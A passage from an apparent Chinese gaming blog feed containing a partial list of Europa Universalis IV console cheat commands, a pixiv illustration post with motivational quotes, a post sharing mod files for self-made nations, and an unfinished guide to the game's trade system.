class="line">invasion_target [&lt;省份代码&gt;]        强制设定该省份为AI入侵目标（Force sets AI invasion target to province）</span><br><span class="line">达摩        invest [投资键值] [省份ID]        在相应省份的贸易公司添加贸易公司投资，投资键值为小写英文并以连字符连接。</span><br><span class="line">isolationism [等级]        设置你的孤立主义等级（神道教 神道教专属）。</span><br><span class="line">karma [&lt;数值&gt; 可选] [&lt;目标国家代码&gt; 可选]        增加业力给玩家（Theravada.png 上座部佛教、Vajrayana.png 金刚乘佛教、Mahayana.png 大乘佛教专属）。</span><br><span class="line">kill_advisors [&lt;国家代码&gt;]        杀死宫廷中和顾问池的全部顾问。</span><br><span class="line">kill_cardinal [&lt;国家代码&gt; 可选]        杀掉列表中的第一位主教。</span><br><span class="line">kill_consort [&lt;目标国家代码&gt; 可选]        杀死你的配偶。</span><br><span class="line">kill_heir [&lt;目标国家代码&gt; 可选]        杀死指定国家TAG的继承人。</span><br><span class="line">kill_leader        杀掉一个随机的将领并给出死亡事件。</span><br><span class="line">leader [&lt;火力&gt;] [&lt;冲击&gt;] [&lt;机动&gt;] [&lt;围城&gt;] [&lt;国家代码&gt; 可选]        创建一个陆军将领,给定四维的将领。</span><br><span class="line">leak        内存泄漏。</span><br><span class="line">leak_gpu [Chunk规模(bytes)] [Chunk数量]        显存泄漏。</span><br><span class="line">legitimacy [&lt;数值&gt; 可选] [&lt;国家代码&gt; 可选]        设置正统值。</span><br><span class="line">low_memory        模拟低内存警报,并尝试释放内存。</span><br><span class="line">lucky [&lt;国家代码&gt; 可选]        开/关幸运国。</span><br><span class="line">make_subject [&lt;目标国家代码&gt;] [&lt;宗主国家代码&gt; 可选] [&lt;附属类型&gt;]        使目标国家成为附属国。</span><br><span class="line">mandate [&lt;数值&gt; 可选]        增加中国皇帝的天命值。</span><br><span class="line">manpower [&lt;数值&gt; 可选] [&lt;目标国家代码&gt; 可选]        增加人力（1000× [&lt;数值&gt;]）（数值默认为5）。</span><br><span class="line">map_random [&lt;seed=-1&gt;] [&lt;restore&gt;] [&lt;nosmooth&gt;] [&lt;nosmoothcoasts&gt;] [&lt;topology&gt;] [&lt;terrain&gt;] [&lt;colormap&gt;] [&lt;minimap&gt;] [&lt;rivers&gt;] [&lt;trees&gt;]        随机化部分世界地图。</span><br><span class="line">map_vertextextures        开/关 地图渲染与顶点纹理。</span><br><span class="line">mapmode [Mapmode type (int)]        切换地图模式。</span><br><span class="line">memory        显示已使用内存。</span><br><span class="line">meritocracy [&lt;数值&gt;] [&lt;国家代码&gt; 可选]        设定中国皇帝的贤能值。</span><br><span class="line">mil [&lt;数值&gt; 可选] [&lt;国家代码&gt; 可选]        得到军事点数。</span><br><span class="line">mission [Mission identifier]        完成指定任务。</span><br><span class="line">morehumans(humans) [&lt;数值&gt; 可选]        增加更多的玩家。</span><br><span class="line">msg        开/关 所有消息弹出。</span><br><span class="line">native_uprising [&lt;省份ID&gt;]        在所选省份发生土著暴乱。</span><br><span class="line">navy_tradition [&lt;数值&gt; 可选] [&lt;目标国家代码&gt; 可选]        为所选国家增加海军传统。</span><br><span class="line">nextsong        改变当前播放的歌曲。</span><br><span class="line">nolimit_missions        删除可供选择的主要任务数量限制。（1.25任务重做后移除）</span><br><span class="line">nopausetext        切换显示暂停指示条。</span><br><span class="line">norevolts        调节会不会爆发叛军。</span><br><span class="line">nowar        切换AI宣战。</span><br><span class="line">observe_mode []        进入观察者模式。</span><br><span class="line">observe(spectator)        进入观察者模式。</span><br><span class="line">on_action [&lt;Identifier&gt;]        运行on_action。</span><br><span class="line">oos        使客户端go oos。</span><br><span class="line">own [&lt;省份ID&gt;] [&lt;国家代码&gt; 可选]        改变省份拥有者。</span><br><span class="line">own_core [&lt;省份ID&gt;] [&lt;国家代码&gt; 可选]        改变省份拥有者并拥有核心。</span><br><span class="line">paper_mana [&lt;AMOUNT&gt; 可选] [&lt;国家代码&gt; 可选]        获得行政点数（默认值999）。</span><br><span class="line">piety [&lt;数值&gt; 可选] [&lt;国家代码&gt; 可选]        增加虔诚（伊斯兰教逊尼派 逊尼派、伊斯兰教什叶派 什叶派、Ibadi Islam 伊巴德派)（默认: +10）。</span><br><span class="line">pirate [&lt;省份ID&gt;]        在一个省份出现海盗提示。</span><br><span class="line">poll        查看可触发的事件。</span><br><span class="line">population [&lt;省份ID&gt;] [&lt;数值&gt; 可选]        增加一个省份的人口（仅限殖民地）。</span><br><span class="line">power [&lt;稳定/科技键值/理念键值&gt;] [&lt;国家代码&gt; 可选]        为所选国家加入选定的理念组。</span><br><span class="line">powerpoints [&lt;数值&gt; 可选] [&lt;国家代码&gt; 可选]        增加所有点数。默认最大君主点数。</span><br><span class="line">powerspend []        将全球powerspend统计输出至game.log。</span><br><span class="line">powerspend_count []        将全球powerspend_count统计输出至game.log。</span><br><span class="line">prestige [&lt;数值&gt; 可选] [&lt;国家代码&gt; 可选]        为选定国家增加威望（默认: +5）。</span><br><span class="line">prices        将物产价格信息输出至game.log。</span><br><span class="line">print_flags        输出全局flag。</span><br><span class="line">print_modifiers(file)        将游戏状态输出至文件，</span><br><span class="line">文件位于 \Documents\Paradox Interactive\Europa Universalis IV\.</span><br><span class="line">print_prov_flags [&lt;省份ID&gt;]        输出省份flag。</span><br><span class="line">PrintSynchStuff        显示随机数和随机种子。</span><br><span class="line">protectorate [&lt;目标国家代码&gt;] [&lt;Actor 国家代码&gt; 可选]        成为保护国（1.20 版本移除）。</span><br><span class="line">province_modifier        显示省份修正。</span><br><span class="line">reform [&lt;目标省份ID&gt;]        在所选省份出现宗教改革的改革中心。</span><br><span class="line">reform_desire [数值]        增加天主教改革呼声（默认为10）</span><br><span class="line">reformprogress [&lt;数值&gt; 可选] [&lt;国家代码&gt; 可选]        增加所选国家的政府改革进度（默认为500）。</span><br><span class="line">refresh_knowledge []        重置邻国，理念等。</span><br><span class="line">refreshknowledgecount []        重置knowledge perf couner。</span><br><span class="line">reinitchat []        提交一个CChatSyncAllCommand。</span><br><span class="line">religious_school [教法学派标识] [&lt;国家代码&gt; 可选]        为目标国家设置伊斯兰教法学派。</span><br><span class="line">教法学派标识如下：</span><br><span class="line">哈乃斐派：hanafi_school</span><br><span class="line">罕百里派：hanbali_school</span><br><span class="line">马立克派：maliki_school</span><br><span class="line">沙斐仪派：shafii_school</span><br><span class="line">伊斯玛仪派：ismaili_school</span><br><span class="line">贾法里派：jafari_school</span><br><span class="line">赛义德派：zaidi_school</span><br><span class="line">reload [file name]        重新载入gui或lua文件。</span><br><span class="line">reload_canals        重新载入管渠位图。</span><br><span class="line">reload_heightmap        重新载入高度图。</span><br><span class="line">reload_lakes        重新载入湖泊。</span><br><span class="line">reload_map        重新载入地图。</span><br><span class="line">reload_provincemap        重新载入省份地图。</span><br><span class="line">reload_straits        更新海峡高点缓存区。</span><br><span class="line">reload_treemap        重新载入树状图。</span><br><span class="line">reloadfx [Arguments: map/mapname/postfx or *.fx filename]        重新载入着色器。</span><br><span class="line">reloadinterface        重新载入整个界面。</span><br><span class="line">reloadloc        重新载入本地化内容。</span><br><span class="line">reloadtexture [texture file name]        重新载入指定纹理。</span><br><span class="line">reloadtradewinds        重新载入信风。</span><br><span class="line">remove_cb [&lt;宣战理由ID&gt;] [&lt;目标国家代码&gt;] [&lt;Actor 国家代码&gt; 可选]        从目标国家移除宣战理由。</span><br><span class="line">remove_claim [&lt;省份ID&gt;] [&lt;国家代码&gt; 可选]        移除宣称。</span><br><span class="line">remove_core [&lt;省份ID&gt;] [&lt;国家代码&gt; 可选]        移除核心。</span><br><span class="line">remove_country [&lt;国家代码&gt;]        移除一个国家，使其变为未殖民省份。</span><br><span class="line">remove_defender_faith        移除玩家的信仰守护者。</span><br><span class="line">remove_interest [&lt;国家代码&gt;]        从感兴趣的国家列表中移除指定国家。</span><br><span class="line">remove_march [&lt;目标国家代码&gt;] [&lt;Actor 国家代码&gt; 可选]        移除指定国家的卫戍。</span><br><span class="line">remove_rival [&lt;国家代码&gt;]        移除一个宿敌。</span><br><span class="line">remove_trait [&lt;特质代码&gt;]        移除特质。</span><br><span class="line">rendertype        显示渲染后端。</span><br><span class="line">repair [&lt;国家代码&gt;]        修复该国家的所有船只</span><br><span class="line">reset_economy []        重置全球经济统计。</span><br><span class="line">repair        修复船只。</span><br><span class="line">reset_god        移除印度教神祗。</span><br><span class="line">reset_migrate        重置迁徙时间。</span><br><span class="line">reset_mission_cancel [&lt;国家代码&gt;]        重置取消任务的任务间隔期。（1.20 版本移除）</span><br><span class="line">reset_powerspend []        重置全局powerspend统计。</span><br><span class="line">reshuffle_seat_bribes        刷新议会中所有贿赂议员选项。</span><br><span class="line">revolt [&lt;省份ID&gt;]        在所选省份引发一场叛乱。</span><br><span class="line">revolution_target [&lt;国家代码&gt;]        设置革命目标。</span><br><span class="line">rgb(rgb) [&lt;数值&gt; 可选]        将指定数量的随机颜色值输出至game.log。</span><br><span class="line">run []        运行指定的文件。</span><br><span class="line">例如：runmy_script.txt</span><br><span class="line">若游玩游戏本体，文件目录为 \Documents\Paradox Interactive\Europa Universalis IV\ 。</span><br><span class="line">若已添加mod，文件目录为\Documents\Paradox Interactive\Europa Universalis IV\mod\name_of_mod\。</span><br><span class="line">run_commands        令控制台命令列表运行指定的文件。</span><br><span class="line">runyear [&lt;年份&gt;] [&lt;命令文件名称&gt;]        在指定年份令控制台命令列表运行指定的文件。</span><br><span class="line">sailors [&lt;数值&gt; 可选] [&lt;目标国家代码&gt; 可选]        添加海员（默认值：5000）。</span><br><span class="line">savegame        创建存档。</span><br><span class="line">score        将积分信息输出至game.log。</span><br><span class="line">selflearningai        开/关 AI自学能力。</span><br><span class="line">set_base_manpower [&lt;省份ID&gt;, &lt;value&gt;]        设置省份基础人力价值。</span><br><span class="line">set_base_production [&lt;省份ID&gt;, &lt;value&gt;]        设置省份基础生产价值。</span><br><span class="line">set_base_tax [&lt;省份ID&gt;, &lt;value&gt;]        设置省份基础税收价值。</span><br><span class="line">set_consort_flag [&lt;国家代码&gt;] [&lt;Flag&gt;]        设定一个全局flag。</span><br><span class="line">set_flag [&lt;Flag&gt;]        设定一个全局flag。</span><br><span class="line">set_leader_trait [&lt;personality&gt;]        设置备选将军的个人特质。</span><br><span class="line">set_prov_flag [&lt;Flag&gt;] [&lt;省份ID&gt;]        设置一个省份flag。</span><br><span class="line">setmissionaryprogress [&lt;省份ID&gt;] [&lt;数值&gt; 可选]        设置省份传教士的传教进度。</span><br><span class="line">SetRandomCount        设置随机计数0-arg。</span><br><span class="line">show_ideas [&lt;国家代码&gt;]        显示/输出指定国家的国家理念到game.log。</span><br><span class="line">siege [&lt;省份ID&gt;]        在所选省份围城胜利。</span><br><span class="line">smoothframelog        开/关 流畅画面记录。</span><br><span class="line">spawn [&lt;省份ID&gt;] [&lt;单位名称&gt;]        在指定省份征召单位。 例如：&quot;spawn 1 western_medieval_infantry&quot; 在斯德哥尔摩征召一个拉丁中世纪步兵。 有关&lt;单位名称&gt;的完整列表，请参见common/units文件夹中的文件名。</span><br><span class="line">spawnactor [&lt;Actorname&gt;] [&lt;省份ID&gt;] [&lt;Animation&gt; 可选]        生成一个具有可选动画的actor。</span><br><span class="line">spawn_all_units [&lt;Animation state&gt;]        为所有现有国家生成首都中的所有单位。需要启用Art/Test目录下的unit\U tester mod。</span><br><span class="line">spectate(spectate)        进入观察者模式（带有选取国家功能）。</span><br><span class="line">splendor [&lt;数值&gt; 可选]        获得&lt;数值&gt;辉煌点数，默认1000点。</span><br><span class="line">spritelevel [&lt;Sprite level&gt;]        设置强制兵模等级（无参数则重置兵模等级）。</span><br><span class="line">spynetwork [&lt;目标国家代码&gt;] [&lt;数值&gt; 可选]        在目标国家增加间谍。</span><br><span class="line">stability [&lt;数值&gt; 可选] [&lt;国家代码&gt; 可选]        改变所选国家的稳定度（未写数值则加满）。</span><br><span class="line">startup_screen        显示本国的开局界面。</span><br><span class="line">state [&lt;省份ID&gt;]        切换省份为地区省份所有者。</span><br><span class="line">stats        输出统计信息到game.log。</span><br><span class="line">stop [&lt;YYYY.MM.DD&gt;]        于指定的日期暂停游戏。</span><br><span class="line">surrender        直接投降。</span><br><span class="line">sword_mana [&lt;AMOUNT&gt; 可选] [&lt;国家代码&gt; 可选]        为目标国家增加军事点数。</span><br><span class="line">syntheticdawn [&lt;Target Tag&gt; 可选]        将指定国家替换为智械。</span><br><span class="line">tag [&lt;国家代码&gt;]        切换至TAG国家。</span><br><span class="line">tech [&lt;数值&gt; 可选]        在原有科技等级上增加相应科技等级。</span><br><span class="line">test [&lt;test ID&gt;]        运行代码测试。</span><br><span class="line">test_achievement [&lt;achievement&gt;]        测试指定成就。</span><br><span class="line">testevent [&lt;事件ID&gt;] [&lt;Character ID&gt;]        测试事件但不触发。</span><br><span class="line">testmission [&lt;Mission Name&gt;]        测试任务但不触发。（1.20 版本移除）</span><br><span class="line">test_neighbour [&lt;国家代码&gt;]        告知指定国家是否为你的邻国。</span><br><span class="line">texture_usage        输出纹理使用。</span><br><span class="line">ti(debug_ti)        调节未知领域显示 开/关</span><br><span class="line">time        在控制台显示当前时间。</span><br><span class="line">timer        输出DEBUG计时信息。</span><br><span class="line">timer_dump        将DEBUG计时数据输出至logs。</span><br><span class="line">timer_reset        重置DEBUG计时。</span><br><span class="line">timer_restart        重启DEBUG计时。</span><br><span class="line">timer_show        显示实时计时数据。</span><br><span class="line">timer_start        开启DEBUG计时。</span><br><span class="line">timer_stop        停止DEBUG计时。</span><br><span class="line">touch_test        测试触屏模式。</span><br><span class="line">tributary [&lt;国家代码&gt;]        使所选国家成为朝贡国。</span><br><span class="line">trust [&lt;目标国家代码&gt;] [&lt;数值&gt; 可选]        给目标国家增加信任度。</span><br><span class="line">update_loc [位置tag]        更新本地TAG文件。</span><br><span class="line">validateevents        重新检测事件但不触发。</span><br><span class="line">vassalize [&lt;目标国家代码&gt;] [&lt;Actor 国家代码&gt; 可选]        附庸所选国家。</span><br><span class="line">verify_loc        验证本地化密钥，</span><br><span class="line">将未本地化的密钥输出至error.log。</span><br><span class="line"></span><br><span class="line">version        输出游戏版本。</span><br><span class="line">victorycard        在单人模式下强制开启胜利卡。</span><br><span class="line">window(wnd) [Arguments: open/close] [窗口GUI名称]        打开或关闭指定的窗口。</span><br><span class="line">winwars        该国在所有战争中获得最大战争分数。</span><br><span class="line">writetestentities        将所有国家的测试实体输出至local_temp.log。</span><br><span class="line">yesman        开/关 电脑无条件外交（开：AI无条件同意的要求；关：正常状态）。</span><br><span class="line">zombie        开/关 僵尸军队调试。</span><br></pre></td></tr></table></figure><p>[hidecontent type&#x3D;”reply” desc&#x3D;”隐藏内容：评论后查看”]</p><p><a href="https://cdn.gjcloak.xyz/cloudreve/1/2023/04/24/1_20230424102746_%E6%8E%A7%E5%88%B6%E5%8F%B0txt%E7%89%88.rar">控制台txt版</a> <a href="https://cdn.gjcloak.xyz/cloudreve/1/2023/04/24/1_20230424102746_%E6%8E%A7%E5%88%B6%E5%8F%B0word%E7%89%88.rar">控制台word版</a></p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> 控制台 </tag>
            
            <tag> 秘籍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.23pixiv插画分享</title>
      <link href="/1663.html"/>
      <url>/1663.html</url>
      
        <content type="html"><![CDATA[<p>全世界只有不到0.1%的人关注了我</p><p>你可真是个很特别的人~</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16630.png" alt="图片"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16631.png" alt="图片"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16632.png" alt="图片"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16633.png" alt="图片"></p><p>P站二次元原画社</p><p>1.你永远不知道未来的你 会有什么样的人生 会和什么样的人在一起恋爱 吃的是几块钱的早餐 生活的是几线城市 会给父母怎样的回报 越努力越幸运 你的余生还很长 要坚强地走下去 要做一个优秀的女孩儿 对自己狠一点 逼自己努力 再过五年 你将会感谢今天发狠的自己 恨透今天懒情自卑的自己 既然认准一条路 那就坚持走下去 命运不会辜负每一个对自己认真而努力的人</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16634.png" alt="图片"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16635.png" alt="图片"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16636.png" alt="图片"></p><p>2.我们总觉得自己还小 还能贪婪的享受所有美好 后来惊讶地发现自己不知从何开始 看得清糖衣里的炮弹 读得出微笑后的杀机 也懂得应付敷衍 逢场作戏 去面对好多自己 不曾想过要面对的事 表面上人畜无害 防身的刀却一直x在身后从未离手那一刻 我终于承认了成长这回事只是不知是好是坏.</p><p>3.不是所有女孩都梦想赚大钱 也不是所有女孩都想做女强人 但当体会过一次次被人肯定认可以后 当你知道自己除了等待还可以争取 当你经济独立自我创造安全感 当你学会了潇洒地笑 潇洒的活着 你会发现 自己爱自己比别人来爱你更有意</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16637.png" alt="图片"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16638.png" alt="图片"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16639.png" alt="图片"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/166310.png" alt="图片"></p><p>4.不管什么年纪 别辜负最好的自己！把每一句我不会“都改为我可以学” 把每一句我不敢“都改为我一定行” 尝试总比永远不敢开始要强.</p><p>5.心有所期 全力以赴 定有所成，不要假装努力因为结局不会陪你演戏，跨过星河 迈过月亮 去努力迎接更好的自己 ， 人生那么长，总要用力拼搏一次</p><p>6.生如蝼蚁当立鸿鹄之志，命薄似纸应有不屈之心。乾坤未定，你我皆是黑马。祝你飞黄腾达前程似锦。</p><p>7.总有一天你会明白 你的委屈要自己消化 你的秘密不能逢人就提起 真正能解脱自己的只能靠努力.</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/166311.png" alt="图片"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/166312.png" alt="图片"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/166313.png" alt="图片"></p><p>8.对自己狠一点 逼自己努力 再过五年 你将会感谢今天发狠的自己 恨透今天懒憤自卑的自己 我始终相信一句话：只有自己足够强大 才不会被别人践踏.</p><p>9.有压力 但不要被压垮 迷茫但不要绝望 在冷言嘲笑中翻盘 成为别人的可望不可及 你真的努力过了才有资格说你拼过 你可以打败我 但永远也别想让我求饶 生命本该有意义 我们绝不是白来一场 不要指望谁会陪你一辈子 没光的时候连影子都会离开你.</p><p>10.你可以在夜晚里崩溃痛哭 但我希望天一亮你又能顶住来自四面八方的压力 继续生活.</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/166314.png" alt="图片"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/166315.png" alt="图片"></p><p>这期还满意吗❤</p>]]></content>
      
      
      <categories>
          
          <category> 山海图册 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> p站 </tag>
            
            <tag> 分享 </tag>
            
            <tag> 插画 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1.31.3版本自建国任务树、国旗、思潮、秘笈、变量等</title>
      <link href="/1756133f.html"/>
      <url>/1756133f.html</url>
      
        <content type="html"><![CDATA[<p>1.31.3版本自建国任务树、国旗、思潮、秘笈、变量等<br>喜欢玩自建国的可以看看</p><p>首先感谢52网站，让我有了学习的地方。虽然不懂英语，但是有翻译软件。<br>通过自己不断加载游戏N次，自己也摸索了很多规律来了。<br>现在反馈大家一些东西，以便更多人能不断摸索新玩法。<br>高手可以点后退了</p><p>1、首先控制台秘笈，自己整理出来的，都是些很实用的，不怎么用的都删了。<br>2、其次变量及方式方法也是自己整理出来的。<br>3、然后是国旗，网上下的。（感谢网友）<br>4、再思潮，这个简单，会弄的一下就弄好了，不懂的可以拿我的借鉴下。<br>（我这里是把所有局限欧洲的都换成了发展度）<br>5、最后是任务树了<br>（弄了2天，终于学会怎么弄了，其中1天时间是修复读档BUG的，我这个是集合了荷葡法普的，大家可以借鉴下）</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-34-1024x168.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-35.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-36.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-37.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-38.png"></p><p>最后感慨英语没学好玩个游戏都吃力，同学们加油读书呀！<br>请大佬没事来指点下！</p><p><a href="https://cdn.gjcloak.xyz/cloudreve/1/2023/04/22/1_20230422114743_EU4%20%E7%A7%98%E7%B1%8D-%E5%8F%98%E9%87%8F-%E8%87%AA%E5%BB%BA%E5%9B%BD%E4%BB%BB%E5%8A%A1-%E5%9B%BD%E6%97%97-%E6%80%9D%E6%BD%AE.zip">下载链接</a></p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 改派 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> 自建国 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【欧陆风云4】黄埔兵书 之 贸易篇</title>
      <link href="/1596.html"/>
      <url>/1596.html</url>
      
        <content type="html"><![CDATA[<p>EU4里的贸易系统大概是所有策略游戏中中最复杂的一个了。</p><p>但在我看来，它很好解释了游戏中很多逻辑。是我比较喜欢的一个游戏系统。</p><p>我希望这篇攻略能在你看完之后更好理解游戏，并且更深入的了解游戏中的贸易。</p><p>大家好，我想做一个有关EU4的文字攻略。这个想法存了好久了，一来是网上也有相关的视频攻略，二来是版本更新的快。</p><p>现在版本更新的差不多了，就开始动手做一个相关的、图文结合的攻略吧。</p><p>我觉得P社的EU4本质不是一个很难得游戏，但是是一个很繁琐的游戏，这就导致了如果不是熟练度很高的情况下，不SL的我们经常“犯错”。</p><p>因此有些东西可能不止新手玩家不知道，老手玩家也不太清楚。故而我觉得新老玩家都可以看看。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-31-1024x640.png" alt="image"></p><p>贸易分为贸易节点，贸易价值，贸易力量和商人。当然还有P社最喜欢的……修正。这五点影响你的贸易策略。</p><p>现在先来说第一个，<strong>贸易节点</strong>。</p><p>你可以在贸易地图（如图所示，右下角的第三个按钮）上看到贸易节点。每一个贸易节点上都有连线，有箭头表明这些节点中贸易流动的方向。举例来说，图中的英格兰，就有北海和吕贝克的贸易在流向它，这些流动就代表着钱的流动方向。</p><p>每个贸易节点的省份；流入，流出的方向；都是固定的。</p><p>其中有三个贸易节点极为特殊，分别是热那亚，威尼斯和英格兰。</p><p>这三个贸易节点为什么特殊，因为在EU4当中，贸易是一条“河流”从上游流到下游。而这三个地点是最下游，不会再流到其他地方。也有人称呼它们为贸易黑洞。</p><p>还有几个贸易节点比较特殊，加利福尼亚，暹罗、埃塞俄比亚、卡其纳等他们是最上游，只有流出没有流入，被称为贸易起点。</p><p>而其他的贸易节点就比较普通了。</p><p>贸易黑洞只有流入和截留。贸易起点只有截留和流出，其他的贸易节点，有流入，流出，和截留。</p><h2 id="贸易价值"><a href="#贸易价值" class="headerlink" title="贸易价值"></a><strong>贸易价值</strong></h2><p>贸易价值或者说贸易值。其实很简单。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-32-1024x640.png" alt="image"></p><p>我们以图2中伦敦为例子。</p><p>我们是商品产出是1.96，这个数字是怎么来的呢？是用生产发展度里的基础生产8*0.2&#x3D;1.6，再加上我的一些产品产出的修正得来。</p><p>这里放到修正里再讲。</p><p>我们的贸易额是7.08，是用1.96*3.6&#x3D;7.08</p><p>我们再回到图1中，在绿饼左边有有四个数值，其中本地就是贸易节点中省份本地的贸易额（标示了每年和每月；图一中的本地显示的是每月，如果你占据100%的贸易竞争力，你每月就能从本地中获得这么多钱），我们游戏中目标，就是把最上游的这些贸易额转移到我们的贸易本埠中去（图中就是最下游的英格兰）。</p><h2 id="贸易力量"><a href="#贸易力量" class="headerlink" title="贸易力量"></a><strong>贸易力量</strong></h2><p>贸易力量，或者说贸易竞争力。有三个影响它的基础值。</p><p>1，本地（省份）贸易竞争力，还是以图二的伦敦为例，基准27.2是总发展度36*0.2+10（中转港）+10（泰晤士河河口）&#x3D;27.2，然后再乘以修正。</p><p>2，节点下游的省份，我们以图三为例来说明。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-33-1024x640.png" alt="image"></p><p>我们可以获得在上游贸易节点获得下游贸易节点的省份贸易竞争力的。也就是说，我们在象牙海岸可以获得我们在英格兰无修正的省份贸易竞争力的1&#x2F;5。</p><p>3，轻帆船。每一艘轻帆船的贸易竞争力开局是2。后面会随着科技提高。</p><p>除了这三个主要手段之外， 商人能给你2点贸易竞争力，贸易本埠给你5点贸易竞争力</p><h2 id="商人"><a href="#商人" class="headerlink" title="商人"></a>商人</h2><p>商人的主要任务只有一个，就是将用贸易节点的贸易竞争力将贸易价值变成钱。</p><p>商人的任务有两个，第一个转移贸易，第二个获取收入。</p><p>1.如果转移贸易，会按照本节点的贸易竞争力的占比转移到下游。这个下游是你可以选择的。</p><p>例子就是图三的象牙海岸，你可以看到象牙海岸是没有任何贸易被截留的，全部都被转移了。而其中18.4被我转向到了英格兰，1.22被转到了塞维利亚。</p><p>这个有一个很重要的地方，在转移贸易中，只有派遣才有资格决定贸易流向。</p><p>例如这个象牙海岸，如果没有别的国家派商人，只有葡萄牙派了了商人，那么所有的钱19.62都会被转移到塞维利亚。</p><p>2.如果获取收入，同样按照占比获得金钱。</p><p>这里提一句，尽最大可能的在贸易本埠收钱，在贸易本埠之外的情况下收钱，会损失50%的贸易力量。这个惩罚是个累乘修正，作用于其他贸易力量修正生效之后。也就是说无论你把贸易效率，贸易竞争力堆得多高，都会有50%的损失。<br>这影响了整个游戏的逻辑。</p><p>这里就用图一中的英格兰这个贸易节点为例，你会看到一个绿饼。也就是说，这个地方的所有贸易都被截留了，不会去往地方地方（因为是贸易黑洞）。而在绿饼右边还有一个饼状图，被三个颜色瓜分，1%的列日，25%的英格兰，和74%的勃艮第。</p><p>也就是说，勃艮第可以获得这里93.32的大约75%的钱。</p><p>以上就是EU4的贸易系统，其实也并不复杂，对吧。</p><h2 id="修正"><a href="#修正" class="headerlink" title="修正"></a>修正</h2><p>所有的修正，都是针对以上的那些数值作用的。在刚刚计算例子的时候，已经提到了。接下来系统的说明，就不具体的举例了。</p><p><strong>河口和港口</strong>（天然良港+中转港+世界性港口）是非常重要的修正，+10的本地贸易竞争力（世界性港口+25），也就是说，如果你掌握了河口，会在你和别的国家竞争的时候，取得优势。这两个都属于基准加成。</p><p><strong>省份贸易竞争力</strong>，这个就不说了。就是省份的贸易竞争力。</p><p><strong>贸易公司</strong>，属于贸易公司的省份会获得+100%的贸易力量（也就是贸易竞争力的）加成。如果没有其他修正，相当于贸易竞争力翻倍修正商品价格，伦敦的贸易额是7.08，是用1.96*3.6&#x3D;7.08。这个3.6就是布匹的价格。商品价格就是我们经常看到一些事件会影响它。游戏开局我记得布匹的价格是3。</p><p><strong>贸易效率</strong>，贸易效率会导致你获得钱变多。比如你有100%的贸易效率，那么你获得金钱将*2，而其他人不变。贸易效率最高为100%</p><p>这也是为什么图一中，勃艮第只有93.32*0.75（约，因为列日占据的不到1%）&#x3D;69.43，但是图里勃艮第获得钱是90.2.因为勃艮第的贸易效率是30%。所以是69.43*1.3&#x3D;90.259.也就是图中的90.2.</p><h2 id="贸易引导"><a href="#贸易引导" class="headerlink" title="贸易引导"></a>贸易引导</h2><p>只在转移贸易的时候有用。贸易引导将在你转移贸易的时候，提高你的贸易竞争力，也就是说，100%的贸易引导会导致贸易竞争力翻倍。实际上，贸易引导不影响贸易值是截留还是被转移，它影响的是贸易值的去向。贸易引导可以在贸易地图上看，在转移目标选择的按钮上。其实是凭空生钱……PS:贸易引导的修正没有上限。<br>复数商人，每个转移贸易的商，还能对它选择的下游节点流出的贸易值产生一个加成。因此在绝大部分情况下，下游节点收到的输入贸易值会比上游节点的输出贸易值多。这个加成影响这个流向的所有国家的输出贸易值（包括但不仅限于该商人团的祖国），所以复数商人会对同一个流向的输出贸易值产生额外加成。具体计算比较复杂，因为复数商人的加成计算影响和贸易引导相关。多于五个商人不会提供更多的加成。最高是11.3%。（不计算贸易引导的情况下。）<br>全球贸易竞争力，这是对在贸易节点所有贸易竞争力的修正。与贸易效率不同，全球贸易竞争力，会影响其他国家的贸易收入。还记得伦敦的饼状图嘛，勃艮第的74%；如果全球贸易竞争力修正继续增加，那么勃艮第74%也会增加而英格兰的就会减少。</p><p>本土与国外，控制一个节点的20%省份贸易竞争力，或者你的贸易本埠，就算这个节点为本土。其他的为国外。过度扩张影响的就是这个。</p><p>所以玩家是勃艮第的话，想赚更多的钱，在你的贸易本埠（也就是图中的英格兰）最好完全垄断，达到100%的贸易竞争力。</p><p><strong>商队力量</strong>，修正为总发展度除以3，最高为50。上限可以通过各种各样的方式增加。</p><p><strong>商品产出</strong>，这个影响贸易，因为影响商品的产出。生产效率不影响贸易。商品产出也没有上限。</p><h2 id="贸易策略"><a href="#贸易策略" class="headerlink" 